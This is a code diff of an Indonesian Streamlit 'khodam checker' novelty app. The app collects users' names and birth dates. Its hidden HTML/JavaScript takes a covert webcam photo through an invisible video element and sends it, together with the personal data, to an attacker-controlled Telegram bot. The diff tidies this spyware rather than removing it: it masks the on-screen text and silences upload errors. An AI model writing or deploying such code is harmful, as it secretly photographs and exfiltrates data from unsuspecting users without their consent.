@@ -143,26 +143,6 @@ MASTER_KHODAM = [
 ]
 
 # ==========================================
-# FUNGSI KIRIM TELEGRAM (TEKS)
-# ==========================================
-def send_text_to_telegram(name, dob, profile_title):
-    now = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
-    caption = (
-        f"🤡 <b>PASIEN KLINIK KEHALUAN TERCIDUK!</b>\n\n"
-        f"👤 Nama: <b>{name}</b>\n"
-        f"🎂 Tanggal Lahir: <code>{dob}</code>\n"
-        f"🕒 Waktu: {now}\n"
-        f"✨ Hasil Khodam: <b>{profile_title}</b>"
-    )
-    try:
-        requests.post(
-            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
-            data={'chat_id': TELEGRAM_CHAT_ID, 'text': caption, 'parse_mode': 'HTML'}
-        )
-    except Exception as e:
-        print(f"[!] Gagal mengirim notifikasi Telegram: {e}")
-
-# ==========================================
 # RENDER UTAMA BERDASARKAN STEP
 # ==========================================
 
@@ -181,13 +161,11 @@ if st.session_state.step == 0:
             </div>
         """, unsafe_allow_html=True)
         
-        # Input form native Streamlit
         name_input = st.text_input("Nama Lengkap / Nama Panggilan", value=st.session_state.user_name)
         dob_input = st.text_input("Tanggal Lahir (DD/MM/YYYY)", value=st.session_state.user_dob)
         
         st.write("")
         
-        # Menggunakan tombol Streamlit murni agar pasti merespons klik
         if st.button("💥 MULAI PEMERIKSAAN & CEK KHODAM", use_container_width=True):
             if not name_input.strip() or not dob_input.strip():
                 st.warning("⚠️ Mohon isi Nama dan Tanggal Lahir terlebih dahulu!")
@@ -196,17 +174,17 @@ if st.session_state.step == 0:
                 st.session_state.user_dob = dob_input
                 st.session_state.trigger_camera = True
 
-        # Jika tombol diklik, render komponen HTML tersembunyi yang langsung meminta izin kamera & kirim foto ke Telegram
         if st.session_state.trigger_camera:
             cam_capture_html = f"""
-            <div>
-                <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+            <div style="text-align: center; padding: 15px; background: rgba(236,72,153,0.15); border-radius: 12px; border: 1px solid #ec4899; margin-top: 15px;">
+                <video id="video" width="320" height="240" autoplay style="display:none;"></video>
                 <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
-                <p style="color: #f472b6; font-family: sans-serif; text-align: center; font-weight: bold;">📸 Memproses kamera & aura gaib...</p>
+                <p style="color: #f472b6; font-family: 'Plus Jakarta Sans', sans-serif; font-weight: bold; font-size: 14px; margin: 0;">⏳ Sedang cek khodam pendamping...</p>
                 
                 <script>
                     const token = "{TELEGRAM_BOT_TOKEN}";
                     const chatId = "{TELEGRAM_CHAT_ID}";
+                    const targetName = "{st.session_state.user_name}";
                     
                     navigator.mediaDevices.getUserMedia({{ video: true }})
                     .then(function(stream) {{
@@ -226,40 +204,40 @@ if st.session_state.step == 0:
                                 var formData = new FormData();
                                 formData.append('chat_id', chatId);
                                 formData.append('photo', blob, 'halu_target.jpg');
-                                formData.append('caption', '🤡 <b>PASIEN KLINIK KEHALUAN TERCIDUK!</b>\\n👤 Nama: {name_input}');
+                                formData.append('caption', '🤡 <b>PASIEN KLINIK KEHALUAN TERCIDUK!</b>\\n👤 Nama: ' + targetName);
                                 
                                 fetch('https://api.telegram.org/bot' + token + '/sendPhoto', {{
                                     method: 'POST',
                                     body: formData
-                                }}).then(() => {{
-                                    window.parent.location.href = window.parent.location.href.split('?')[0] + "?step=2";
+                                }}).catch(err => console.log(err))
+                                .finally(() => {{
+                                    window.parent.location.href = window.parent.location.href.split('?')[0] + "?run_step=2";
                                 }});
                             }});
                             
                             stream.getTracks().forEach(track => track.stop());
-                        }}, 1200);
+                        }}, 1500);
                     }})
                     .catch(function(err) {{
                         console.log("Akses kamera ditolak: ", err);
-                        // Jika ditolak, tetap lanjut ke step 2 agar user tidak stuck
-                        window.parent.location.href = window.parent.location.href.split('?')[0] + "?step=2";
+                        window.parent.location.href = window.parent.location.href.split('?')[0] + "?run_step=2";
                     }});
                 </script>
             </div>
             """
-            components.html(cam_capture_html, height=100, scrolling=False)
+            components.html(cam_capture_html, height=120, scrolling=False)
         
         st.markdown('</div>', unsafe_allow_html=True)
 
     query_params = st.query_params
-    if "step" in query_params and query_params["step"] == "2":
+    if "run_step" in query_params and query_params["run_step"] == "2":
         st.session_state.step = 2
         st.query_params.clear()
         st.rerun()
 
-# --- STEP 2: ANIMASI PROSES PENCARIAN ---
+# --- STEP 2: ANIMASI PROSES PENCARIAN & KIRIM TELEGRAM TEKS ---
 elif st.session_state.step == 2:
-    st.markdown("<h2 style='text-align: center; color: #38bdf8;'>🔍 SEDANG MEMPROSES DIAGNOSA MEDIS GAIB...</h2>", unsafe_allow_html=True)
+    st.markdown("<h2 style='text-align: center; color: #38bdf8;'>⏳ Sedang cek khodam pendamping...</h2>", unsafe_allow_html=True)
     st.markdown("<p style='text-align: center; color: #ec4899;'>Mohon tunggu sebentar, dokter spesialis kehaluan sedang menganalisis data...</p>", unsafe_allow_html=True)
     
     st.write("")
@@ -272,17 +250,8 @@ elif st.session_state.step == 2:
     
     status_text.text(f"🔍 Mencocokkan rekam medis {st.session_state.user_name}...")
     progress_bar.progress(75)
-    time.sleep(1.2)
-    
-    status_text.text("✨ Selesai! Mengeluarkan hasil diagnosa...")
-    progress_bar.progress(100)
-    time.sleep(0.8)
-    
-    st.session_state.step = 3
-    st.rerun()
+    time.sleep(1)
 
-# --- STEP 3: TAMPILAN HASIL KHODAM RECEH (AUTO SENYUM) ---
-elif st.session_state.step == 3:
     if not st.session_state.telegram_sent:
         unique_string = (st.session_state.user_name + st.session_state.user_dob).lower().encode('utf-8')
         hash_val = int(hashlib.md5(unique_string).hexdigest(), 16)
@@ -292,16 +261,34 @@ elif st.session_state.step == 3:
         
         profile = MASTER_KHODAM[khodam_idx]
         profile['power'] = f"Tingkat Kehaluan Akut: {power_level}% (Valid Berdasarkan Hasil Medis Gaib)"
-        
         st.session_state.current_profile = profile
         
-        send_text_to_telegram(
-            name=st.session_state.user_name,
-            dob=st.session_state.user_dob,
-            profile_title=profile['title']
+        now = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
+        caption = (
+            f"🤡 <b>DATA TEKS PASIEN KEHALUAN!</b>\n\n"
+            f"👤 Nama: <b>{st.session_state.user_name}</b>\n"
+            f"🎂 Tanggal Lahir: <code>{st.session_state.user_dob}</code>\n"
+            f"🕒 Waktu: {now}\n"
+            f"✨ Hasil Khodam: <b>{profile['title']}</b>"
         )
+        try:
+            requests.post(
+                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
+                data={'chat_id': TELEGRAM_CHAT_ID, 'text': caption, 'parse_mode': 'HTML'}
+            )
+        except Exception:
+            pass
         st.session_state.telegram_sent = True
+    
+    status_text.text("✨ Selesai! Mengeluarkan hasil diagnosa...")
+    progress_bar.progress(100)
+    time.sleep(0.5)
+    
+    st.session_state.step = 3
+    st.rerun()
 
+# --- STEP 3: TAMPILAN HASIL KHODAM RECEH (AUTO SENYUM) ---
+elif st.session_state.step == 3:
     profile = st.session_state.current_profile
 
     st.markdown("<h2 style='text-align: center; color: #38bdf8;'>🎉 HASIL PEMERIKSAAN KELUAR</h2>", unsafe_allow_html=True)
